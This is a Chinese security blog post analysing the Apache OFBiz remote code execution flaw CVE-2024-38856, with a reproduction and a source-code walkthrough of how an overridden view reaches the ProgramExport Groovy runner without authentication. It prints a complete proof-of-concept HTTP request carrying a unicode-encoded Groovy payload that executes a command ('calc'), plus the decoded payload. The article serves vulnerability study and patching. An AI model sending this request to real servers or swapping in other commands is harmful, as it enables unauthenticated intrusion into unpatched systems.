---
title: Apache OFBiz远程代码执行漏洞（CVE-2024-38856）
url: https://www.secpulse.com/archives/205429.html
source: 安全脉搏
date: 2024-12-31
fetch_date: 2025-10-06T19:37:27.400497
---

# Apache OFBiz远程代码执行漏洞（CVE-2024-38856）

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# Apache OFBiz远程代码执行漏洞（CVE-2024-38856）

[漏洞](https://www.secpulse.com/archives/category/vul)

[蚁景网安实验室](https://www.secpulse.com/newpage/author?author_id=37244)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng2.png)

2024-12-30

9,706

## 漏洞简介

Apache OFBiz 是一个开源的企业资源规划系统，提供了一整套企业管理解决方案，涵盖了许多领域，包括财务管理、供应链管理、客户关系管理、人力资源管理和电子商务等。Apache OFBiz 基于 Java 开发，采用灵活的架构和模块化设计，使其可以根据企业的需求进行定制和扩展，它具有强大的功能和可扩展性，适用于中小型企业和大型企业，帮助他们提高效率，降低成本，并实现业务流程的自动化和优化。Apache OFBiz 在处理 view 视图渲染的时候存在逻辑缺陷，未经身份验证的攻击者可通过构造特殊 URL 来覆盖最终的渲染视图，从而执行任意代码。

影响版本

Apache OFBiz <\= 18.12.14

## 漏洞复现

<https://github.com/apache/ofbiz-framework/releases/tag/release18.12.14>

下载代码链接 <https://codeload.github.com/apache/ofbiz-framework/zip/refs/tags/release18.12.14>

下载后利用 idea 打开并编译运行

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202409121500917.png)

构造发送数据包

```
POST /webtools/control/main/ProgramExport HTTP/1.1
Host: 127.0.0.1:8443
Connection: close
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 272

groovyProgram=\u0074\u0068\u0072\u006f\u0077\u0020\u006e\u0065\u0077\u0020\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e\u0028\u0027\u0063\u0061\u006c\u0063\u0027\u002e\u0065\u0078\u0065\u0063\u0075\u0074\u0065\u0028\u0029\u002e\u0074\u0065\u0078\u0074\u0029\u003b
```

成功执行打开计算器的命令

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202409121500919.png)

`\u0074\u0068\u0072\u006f\u0077\u0020\u006e\u0065\u0077\u0020\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e\u0028\u0027\u0063\u0061\u006c\u0063\u0027\u002e\u0065\u0078\u0065\u0063\u0075\u0074\u0065\u0028\u0029\u002e\u0074\u0065\u0078\u0074\u0029\u003b` 是 `throw new Exception('calc'.execute().text);` 进行编码后的数据

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202409121500920.png)

## 漏洞分析

`applications\accounting\webapp\accounting\WEB-INF\web.xml`

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202409121500921.png)

`org.apache.ofbiz.webapp.control.ControlServlet` 会处理所有以`/control/`开头的路由

`org.apache.ofbiz.webapp.control.ControlServlet#doPost`

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202409121500922.png)

doPost 方法转换为 doGet 请求

`org.apache.ofbiz.webapp.control.ControlServlet#doGet`

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202409121500923.png)

利用 `RequestHandler` 来处理请求

`org.apache.ofbiz.webapp.control.RequestHandler#doRequest`

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202409121500924.png)

在 `RequestHandler#doRequest` 中依次获取路由相关参数

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202409121500925.png)

`org.apache.ofbiz.base.util.UtilHttp#getApplicationName`

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202409121500926.png)

`org.apache.ofbiz.webapp.control.RequestHandler#getRequestUri`

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202409121500927.png)

`org.apache.ofbiz.webapp.control.RequestHandler#getOverrideViewUri`

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202409121500929.png)

依次获取到与路由相关的参数后，调用 `resolveURI` 返回路由对应的配置信息

`org.apache.ofbiz.webapp.control.RequestHandler#resolveURI`

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202409121500930.png)

这里对应的是

`framework/webtools/webapp/webtools/WEB-INF/controller.xml`

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202409121500931.png)

对应的 `/webtools/control/main/` 不需要认证，所以可以继续向下执行

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202409121500932.png)

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202409121500933.png)

通过success获取到返回值的数据赋值给successResponse,然后传递给nextRequestResponse

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202409121500934.png)

```
else if ("view".equals(nextRequestResponse.type)) {
                if (Debug.verboseOn()) Debug.logVerbose("[RequestHandler.doRequest]: Response is a view." + showSessionId(request), module);

                // check for an override view, only used if "success" = eventReturn
                String viewName = (UtilValidate.isNotEmpty(overrideViewUri) && (eventReturn == null || "success".equals(eventReturn))) ? overrideViewUri : nextRequestResponse.value;
                renderView(viewName, requestMap.securityExternalView, request, response, saveName);
            }
```

在`overrideViewUri` 非空且 `eventReturn` 为 `null` 或 `"success"` 的情况下，将 `viewName` 设置为 `overrideViewUri`。否则将 `viewName` 设置为 `nextRequestResponse.value`。

这里请求的路径为 `/main/ProgramExport` 造成 view 的解析冲突，会进入到 ProgramExport 这个业务中 ，renderView 方法会解析与ProgramExport对应的请求

`framework/webtools/widget/EntityScreens.xml`

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202409121500935.png)

`framework/webtools/groovyScripts/entity/ProgramExport.groovy`

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202409121500936.png)

**本文作者：[蚁景网安实验室](newpage/author?author_id=37244)**

**本文为安全脉搏专栏作者发布，转载请注明：**[**https://www.secpulse.com/archives/205429.html**](https://www.secpulse.com/archives/205429.html)

点赞：
0
[评论：0](#goComment)
收藏：
0

*新浪微博
QQ空间
微信扫一扫*

### 相关文章

* [![Solon框架模板漏洞深度剖析与修复实战](https://www.yijinglab.com/guide-img/d9634e2f-3b66-42e7-8279-c0877cdd70e5/7266edd7-a4cc-444d-bacb-7ee802487ac4.png)

  Solon框架模板漏洞深度剖析与修复实战](https://www.secpulse.com/archives/206316.html "详细阅读 Solon框架模板漏洞深度剖析与修复实战")
* [![路由器安全研究：D-Li...